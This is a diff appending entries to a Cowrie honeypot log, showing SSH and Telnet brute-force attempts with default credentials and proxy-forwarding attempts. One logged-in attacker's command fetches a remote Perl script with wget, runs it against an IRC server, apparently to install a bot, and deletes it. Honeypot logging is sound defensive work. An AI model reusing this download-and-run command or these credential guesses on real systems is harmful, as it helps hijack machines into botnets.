@@ -6647,3 +6647,122 @@
 2017-06-06T14:12:59+0000 [HoneyPotSSHTransport,7268,59.110.235.158] starting service 'ssh-userauth'
 2017-06-06T14:12:59+0000 [CowrieTelnetTransport,19467,109.236.83.181] login attempt: 5332
 2017-06-06T14:12:59+0000 [CowrieTelnetTransport,19467,109.236.83.181] login return, expect: [default/]
+2017-06-06T14:13:01+0000 [CowrieTelnetTransport,19467,109.236.83.181] login attempt [enable/system] failed
+2017-06-06T14:13:01+0000 [CowrieTelnetTransport,19467,109.236.83.181] Warning: state changed and new state returned
+2017-06-06T14:13:03+0000 [CowrieTelnetTransport,19467,109.236.83.181] login attempt: 5333
+2017-06-06T14:13:03+0000 [CowrieTelnetTransport,19467,109.236.83.181] login return, expect: [default/]
+2017-06-06T14:13:05+0000 [CowrieTelnetTransport,19467,109.236.83.181] login attempt [shell/sh] failed
+2017-06-06T14:13:05+0000 [CowrieTelnetTransport,19467,109.236.83.181] Warning: state changed and new state returned
+2017-06-06T14:13:05+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,7268,59.110.235.158] 'root' trying auth 'password'
+2017-06-06T14:13:05+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,7268,59.110.235.158] login attempt: 11
+2017-06-06T14:13:05+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,7268,59.110.235.158] login return, expect: [root/123456]
+2017-06-06T14:13:07+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,7268,59.110.235.158] login attempt [root/1qaz@WSX] failed
+2017-06-06T14:13:07+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 62.210.247.58:53739 (10.8.41.81:2222) [session: 03372b5b]
+2017-06-06T14:13:07+0000 [HoneyPotSSHTransport,7269,62.210.247.58] Remote SSH version: SSH-2.0-libssh2_1.4.3
+2017-06-06T14:13:07+0000 [HoneyPotSSHTransport,7269,62.210.247.58] kex alg, key alg: 'diffie-hellman-group14-sha1' 'ssh-rsa'
+2017-06-06T14:13:07+0000 [HoneyPotSSHTransport,7269,62.210.247.58] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-06-06T14:13:07+0000 [HoneyPotSSHTransport,7269,62.210.247.58] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-06-06T14:13:07+0000 [HoneyPotSSHTransport,7269,62.210.247.58] NEW KEYS
+2017-06-06T14:13:07+0000 [HoneyPotSSHTransport,7269,62.210.247.58] starting service 'ssh-userauth'
+2017-06-06T14:13:07+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,7269,62.210.247.58] 'abraham' trying auth 'password'
+2017-06-06T14:13:07+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,7269,62.210.247.58] first time for 62.210.247.58, need: 1
+2017-06-06T14:13:07+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,7269,62.210.247.58] login attempt: 1
+2017-06-06T14:13:09+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,7269,62.210.247.58] login attempt [abraham/abraham] succeeded
+2017-06-06T14:13:11+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,7269,62.210.247.58] 'abraham' authenticated with 'password'
+2017-06-06T14:13:11+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,7269,62.210.247.58] starting service 'ssh-connection'
+2017-06-06T14:13:11+0000 [-] 'root' failed auth 'password'
+2017-06-06T14:13:11+0000 [-] unauthorized login: 
+2017-06-06T14:13:11+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,7269,62.210.247.58] got channel 'session' request
+2017-06-06T14:13:11+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,7269,62.210.247.58] channel open
+2017-06-06T14:13:11+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,7269,62.210.247.58] executing command "uname -a; cd /tmp ; wget http://www.studyonazar.com/maxx.txt ; perl maxx.txt irc.galaxychat.org ; rm -rf maxx.txt"
+2017-06-06T14:13:11+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,7269,62.210.247.58] Opening TTY Log: log/tty/20170606-141311-03372b5b-0e.log
+2017-06-06T14:13:11+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,7269,62.210.247.58] CMD: uname -a; cd /tmp ; wget http://www.studyonazar.com/maxx.txt ; perl maxx.txt irc.galaxychat.org ; rm -rf maxx.txt
+2017-06-06T14:13:11+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,7269,62.210.247.58] Command found: uname -a
+2017-06-06T14:13:11+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,7269,62.210.247.58] Command found: cd /tmp
+2017-06-06T14:13:11+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,7269,62.210.247.58] Command found: wget http://www.studyonazar.com/maxx.txt
+2017-06-06T14:13:11+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://www.studyonazar.com/maxx.txt>
+2017-06-06T14:13:11+0000 [HoneyPotSSHTransport,7268,59.110.235.158] Got remote error, code 11
+	reason: Bye Bye
+2017-06-06T14:13:11+0000 [HoneyPotSSHTransport,7268,59.110.235.158] connection lost
+2017-06-06T14:13:11+0000 [HoneyPotSSHTransport,7268,59.110.235.158] Connection lost after 16 seconds
+2017-06-06T14:13:11+0000 [HTTPPageDownloader,client] Not storing duplicate content ac7fc0276a3564a15b0d4462794c173df51a1c482b8974aba554aa4259bfaad5
+2017-06-06T14:13:11+0000 [HTTPPageDownloader,client] Downloaded URL (http://www.studyonazar.com/maxx.txt) with SHA-256 ac7fc0276a3564a15b0d4462794c173df51a1c482b8974aba554aa4259bfaad5 to dl/ac7fc0276a3564a15b0d4462794c173df51a1c482b8974aba554aa4259bfaad5
+2017-06-06T14:13:11+0000 [HTTPPageDownloader,client] Command found: perl /tmp/maxx.txt irc.galaxychat.org
+2017-06-06T14:13:11+0000 [HTTPPageDownloader,client] Command found: rm -rf /tmp/maxx.txt
+2017-06-06T14:13:11+0000 [HTTPPageDownloader,client] exitCode: 0
+2017-06-06T14:13:11+0000 [HTTPPageDownloader,client] sending request 'exit-status'
+2017-06-06T14:13:11+0000 [HTTPPageDownloader,client] Not storing duplicate content ac7fc0276a3564a15b0d4462794c173df51a1c482b8974aba554aa4259bfaad5
+2017-06-06T14:13:11+0000 [HTTPPageDownloader,client] Saved redir contents with SHA-256 ac7fc0276a3564a15b0d4462794c173df51a1c482b8974aba554aa4259bfaad5 to dl/ac7fc0276a3564a15b0d4462794c173df51a1c482b8974aba554aa4259bfaad5
+2017-06-06T14:13:11+0000 [HTTPPageDownloader,client] Closing TTY Log: log/tty/20170606-141311-03372b5b-0e.log after 0 seconds
+2017-06-06T14:13:11+0000 [HTTPPageDownloader,client] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionDone'>: Connection was closed cleanly.
+	]
+2017-06-06T14:13:11+0000 [HTTPPageDownloader,client] sending close 0
+2017-06-06T14:13:11+0000 [HTTPPageDownloader,client] Connection was probably lost. Could not write to terminal
+2017-06-06T14:13:11+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://www.studyonazar.com/maxx.txt>
+2017-06-06T14:13:11+0000 [HoneyPotSSHTransport,7269,62.210.247.58] Got remote error, code 11
+	reason: Normal Shutdown, Thank you for playing
+2017-06-06T14:13:11+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,7269,62.210.247.58] remote close
+2017-06-06T14:13:11+0000 [HoneyPotSSHTransport,7269,62.210.247.58] avatar abraham logging out
+2017-06-06T14:13:11+0000 [HoneyPotSSHTransport,7269,62.210.247.58] connection lost
+2017-06-06T14:13:11+0000 [HoneyPotSSHTransport,7269,62.210.247.58] Connection lost after 4 seconds
+2017-06-06T14:13:12+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 113.130.247.67:57987 (10.8.41.81:2223) [session: TT19473]
+2017-06-06T14:13:25+0000 [CowrieTelnetTransport,19473,113.130.247.67] login attempt: 17
+2017-06-06T14:13:25+0000 [CowrieTelnetTransport,19473,113.130.247.67] login return, expect: [root/root]
+2017-06-06T14:13:27+0000 [CowrieTelnetTransport,19473,113.130.247.67] login attempt [guest/12345] failed
+2017-06-06T14:13:27+0000 [CowrieTelnetTransport,19473,113.130.247.67] Warning: state changed and new state returned
+2017-06-06T14:13:27+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,7195,91.230.47.82] got channel 'direct-tcpip' request
+2017-06-06T14:13:27+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,7195,91.230.47.82] direct-tcp connection request to 108.177.14.94:443 from localhost:5556
+2017-06-06T14:13:28+0000 [SSHChannel None (23) on SSHService 'ssh-connection' on HoneyPotSSHTransport,7195,91.230.47.82] direct-tcp forward to 108.177.14.94:443 with data '\x16\x03\x01\x01x\x01\x00\x01t\x03\x03Y6\xb8T\xe1q\xec\xe1\x83\n\x96\xcb\n\xca\x8c\x94\xdc\x9a\xd7:r\xdeKw\xfa\xa8\x15\x06\xc3\x91\x05*\x00\x00\xca\xc00\xc0,\xc0(\xc0$\xc0\x14\xc0\n\xc0"\xc0!\x00\xa3\x00\x9f\x00k\x00j\x009\x008\x00\x88\x00\x87\xc0\x19\xc0 \x00\xa7\x00m\x00:\x00\x89\xc02\xc0.\xc0*\xc0&\xc0\x0f\xc0\x05\x00\x9d\x00=\x005\x00\x84\xc0\x12\xc0\x08\xc0\x1c\xc0\x1b\x00\x16\x00\x13\xc0\x17\xc0\x1a\x00\x1b\xc0\r\xc0\x03\x00\n\xc0/\xc0+\xc0\'\xc0#\xc0\x13\xc0\t\xc0\x1f\xc0\x1e\x00\xa2\x00\x9e\x00g\x00@\x003\x002\x00\x9a\x00\x99\x00E\x00D\xc0\x18\xc0\x1d\x00\xa6\x00l\x004\x00\x9b\x00F\xc01\xc0-\xc0)\xc0%\xc0\x0e\xc0\x04\x00\x9c\x00<\x00/\x00\x96\x00A\x00\x07\xc0\x11\xc0\x07\xc0\x16\x00\x18\xc0\x0c\xc0\x02\x00\x05\x00\x04\x00\x15\x00\x12\x00\x1a\x00\t\x00\x14\x00\x11\x00\x19\x00\x08\x00\x06\x00\x17\x00\x03\x00\xff\x01\x00\x00\x81\x00\x00\x00\x12\x00\x10\x00\x00\rwww.google.ru\x00\x0b\x00\x04\x03\x00\x01\x02\x00\n\x004\x002\x00\x0e\x00\r\x00\x19\x00\x0b\x00\x0c\x00\x18\x00\t\x00\n\x00\x16\x00\x17\x00\x08\x00\x06\x00\x07\x00\x14\x00\x15\x00\x04\x00\x05\x00\x12\x00\x13\x00\x01\x00\x02\x00\x03\x00\x0f\x00\x10\x00\x11\x00\r\x00"\x00 \x06\x01\x06\x02\x06\x03\x05\x01\x05\x02\x05\x03\x04\x01\x04\x02\x04\x03\x03\x01\x03\x02\x03\x03\x02\x01\x02\x02\x02\x03\x01\x01\x00\x0f\x00\x01\x01'
+2017-06-06T14:13:28+0000 [SSHChannel None (23) on SSHService 'ssh-connection' on HoneyPotSSHTransport,7195,91.230.47.82] failed to connect: Connection refused
+2017-06-06T14:13:28+0000 [SSHChannel None (23) on SSHService 'ssh-connection' on HoneyPotSSHTransport,7195,91.230.47.82] sending close 23
+2017-06-06T14:13:32+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 113.130.247.67:58610 (10.8.41.81:2223) [session: TT19474]
+2017-06-06T14:13:32+0000 [CowrieTelnetTransport,19464,46.166.185.137] Closing TTY Log: log/tty/20170606-141113-None-19464i.log after 139 seconds
+2017-06-06T14:13:32+0000 [CowrieTelnetTransport,19464,46.166.185.137] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionDone'>: Connection was closed cleanly.
+	]
+2017-06-06T14:13:32+0000 [CowrieTelnetTransport,19464,46.166.185.137] Connection lost after 148 seconds
+2017-06-06T14:13:33+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 109.236.83.229:49708 (10.8.41.81:2223) [session: TT19475]
+2017-06-06T14:13:38+0000 [CowrieTelnetTransport,19473,113.130.247.67] login attempt: 18
+2017-06-06T14:13:38+0000 [CowrieTelnetTransport,19473,113.130.247.67] login return, expect: [root/root]
+2017-06-06T14:13:40+0000 [CowrieTelnetTransport,19473,113.130.247.67] login attempt [enable\x00/system\x00] failed
+2017-06-06T14:13:40+0000 [CowrieTelnetTransport,19473,113.130.247.67] Warning: state changed and new state returned
+2017-06-06T14:13:40+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,7165,91.230.47.70] got channel 'direct-tcpip' request
+2017-06-06T14:13:40+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,7165,91.230.47.70] direct-tcp connection request to 23.61.228.129:443 from localhost:5556
+2017-06-06T14:13:40+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 104.236.52.155:38691 (10.8.41.81:2222) [session: 6638012a]
+2017-06-06T14:13:41+0000 [CowrieTelnetTransport,19475,109.236.83.229] login attempt: 3004
+2017-06-06T14:13:41+0000 [CowrieTelnetTransport,19475,109.236.83.229] login return, expect: [root/12345]
+2017-06-06T14:13:43+0000 [CowrieTelnetTransport,19475,109.236.83.229] login attempt [root/anko] failed
+2017-06-06T14:13:43+0000 [CowrieTelnetTransport,19475,109.236.83.229] Warning: state changed and new state returned
+2017-06-06T14:13:43+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 62.210.247.58:39056 (10.8.41.81:2222) [session: 178a7150]
+2017-06-06T14:13:43+0000 [HoneyPotSSHTransport,7270,104.236.52.155] connection lost
+2017-06-06T14:13:43+0000 [HoneyPotSSHTransport,7270,104.236.52.155] Connection lost after 3 seconds
+2017-06-06T14:13:43+0000 [HoneyPotSSHTransport,7271,62.210.247.58] Remote SSH version: SSH-2.0-libssh2_1.4.3
+2017-06-06T14:13:43+0000 [HoneyPotSSHTransport,7271,62.210.247.58] kex alg, key alg: 'diffie-hellman-group14-sha1' 'ssh-rsa'
+2017-06-06T14:13:43+0000 [HoneyPotSSHTransport,7271,62.210.247.58] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-06-06T14:13:43+0000 [HoneyPotSSHTransport,7271,62.210.247.58] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-06-06T14:13:43+0000 [CowrieTelnetTransport,19475,109.236.83.229] login attempt: 3005
+2017-06-06T14:13:43+0000 [CowrieTelnetTransport,19475,109.236.83.229] login return, expect: [root/12345]
+2017-06-06T14:13:45+0000 [CowrieTelnetTransport,19475,109.236.83.229] login attempt [enable/system] failed
+2017-06-06T14:13:45+0000 [CowrieTelnetTransport,19475,109.236.83.229] Warning: state changed and new state returned
+2017-06-06T14:13:46+0000 [CowrieTelnetTransport,19475,109.236.83.229] login attempt: 3006
+2017-06-06T14:13:46+0000 [CowrieTelnetTransport,19475,109.236.83.229] login return, expect: [root/12345]
+2017-06-06T14:13:47+0000 [CowrieTelnetTransport,19475,109.236.83.229] login attempt [shell/sh] failed
+2017-06-06T14:13:47+0000 [CowrieTelnetTransport,19475,109.236.83.229] Warning: state changed and new state returned
+2017-06-06T14:13:48+0000 [SSHChannel None (84) on SSHService 'ssh-connection' on HoneyPotSSHTransport,7165,91.230.47.70] direct-tcp forward to 23.61.228.129:443 with data "\x16\x03\x03\x00\xc3\x01\x00\x00\xbf\x03\x03Y6\xb8h\xe5\xfb\xb8\xe0\x97+C\xab\xdd\x98\xa4\x99ZTR\xc4<\xda\x93h\x87\x1f\xf5\xf9\xabpl\xa0\x00\x00<\xc0,\xc0+\xc00\xc0/\x00\x9f\x00\x9e\xc0$\xc0#\xc0(\xc0'\xc0\n\xc0\t\xc0\x14\xc0\x13\x009\x003\x00\x9d\x00\x9c\x00=\x00<\x005\x00/\x00\n\x00j\x00@\x008\x002\x00\x13\x00\x05\x00\x04\x01\x00\x00Z\x00\x00\x00\x1f\x00\x1d\x00\x00\x1aauth.np.ac.playstation.net\x00\n\x00\x08\x00\x06\x00\x1d\x00\x17\x00\x18\x00\x0b\x00\x02\x01\x00\x00\r\x00\x14\x00\x12\x04\x01\x05\x01\x02\x01\x04\x03\x05\x03\x02\x03\x02\x02\x06\x01\x06\x03\x00#\x00\x00\x00\x17\x00\x00\xff\x01\x00\x01\x00"
+2017-06-06T14:13:48+0000 [SSHChannel None (84) on SSHService 'ssh-connection' on HoneyPotSSHTransport,7165,91.230.47.70] failed to connect: Connection refused
+2017-06-06T14:13:48+0000 [SSHChannel None (84) on SSHService 'ssh-connection' on HoneyPotSSHTransport,7165,91.230.47.70] sending close 84
+2017-06-06T14:13:48+0000 [CowrieTelnetTransport,19473,113.130.247.67] login attempt: 19
+2017-06-06T14:13:48+0000 [CowrieTelnetTransport,19473,113.130.247.67] login return, expect: [root/root]
+2017-06-06T14:13:50+0000 [CowrieTelnetTransport,19473,113.130.247.67] login attempt [shell\x00/sh\x00] failed
+2017-06-06T14:13:50+0000 [CowrieTelnetTransport,19473,113.130.247.67] Warning: state changed and new state returned
+2017-06-06T14:13:50+0000 [HoneyPotSSHTransport,7271,62.210.247.58] NEW KEYS
+2017-06-06T14:13:50+0000 [HoneyPotSSHTransport,7271,62.210.247.58] starting service 'ssh-userauth'
+2017-06-06T14:13:50+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,7271,62.210.247.58] 'adam' trying auth 'password'
+2017-06-06T14:13:50+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,7271,62.210.247.58] login attempt: 2
+2017-06-06T14:13:50+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,7271,62.210.247.58] login return, expect: [abraham/abraham]
+2017-06-06T14:13:52+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,7271,62.210.247.58] login attempt [adam/adam] failed
+2017-06-06T14:13:53+0000 [-] 'adam' failed auth 'password'
+2017-06-06T14:13:53+0000 [-] unauthorized login: 
+2017-06-06T14:13:53+0000 [HoneyPotSSHTransport,7271,62.210.247.58] Got remote error, code 11
+	reason: Normal Shutdown, Thank you for playing
+2017-06-06T14:13:53+0000 [HoneyPotSSHTransport,7271,62.210.247.58] connection lost
+2017-06-06T14:13:53+0000 [HoneyPotSSHTransport,7271,62.210.247.58] Connection lost after 9 seconds
